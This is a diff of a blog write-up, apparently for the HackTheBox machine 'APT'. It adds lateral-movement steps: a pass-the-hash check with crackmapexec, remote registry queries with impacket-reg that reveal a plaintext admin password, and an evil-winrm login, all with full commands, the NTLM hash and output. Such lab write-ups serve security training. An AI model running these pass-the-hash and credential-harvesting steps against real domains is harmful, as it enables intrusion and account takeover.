@@ -324,7 +324,37 @@ if __name__ == &#39;__main__&#39;:
 </code></pre><ul><li>Check if hash is valid</li></ul><pre tabindex=0><code>└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H &#39;e53d87d42adaa3ca32bdb34a876cbffb&#39;             
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
-</code></pre><ul><li>But the user doesn&rsquo;t have <code>winrm</code> permissions</li></ul><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>But the user doesn&rsquo;t have <code>winrm</code> permissions<ul><li>We can read <code>registry</code> remotely using <code>impacket-reg</code></li></ul></li></ul><pre tabindex=0><code>└─$ impacket-reg -hashes &#39;:e53d87d42adaa3ca32bdb34a876cbffb&#39; -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE                                
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE
+HKU\SOFTWARE\GiganticHostingManagementSystem
+HKU\SOFTWARE\Microsoft
+HKU\SOFTWARE\Policies
+HKU\SOFTWARE\RegisteredApplications
+HKU\SOFTWARE\Sysinternals
+HKU\SOFTWARE\VMware, Inc.
+HKU\SOFTWARE\Wow6432Node
+HKU\SOFTWARE\Classes
+</code></pre><ul><li>There is a strange software <code>GiganticHostingManagementSystem</code><ul><li>Checking it gives us creds</li></ul></li></ul><pre tabindex=0><code>└─$ impacket-reg -hashes &#39;:e53d87d42adaa3ca32bdb34a876cbffb&#39; -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE\GiganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht
+</code></pre><ul><li>We can <code>winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -i apt -u henry.vinson_adm -p &#39;G1#Ny5@2dvht&#39;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; 
+</code></pre><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fapt%2f&text=%5bHTB%5d%20Machine%3a%20APT&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fapt%2f&title=%5bHTB%5d%20Machine%3a%20APT" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fapt%2f&title=%5bHTB%5d%20Machine%3a%20APT" target=_blank><i class="fab fa-linkedin"></i></a>
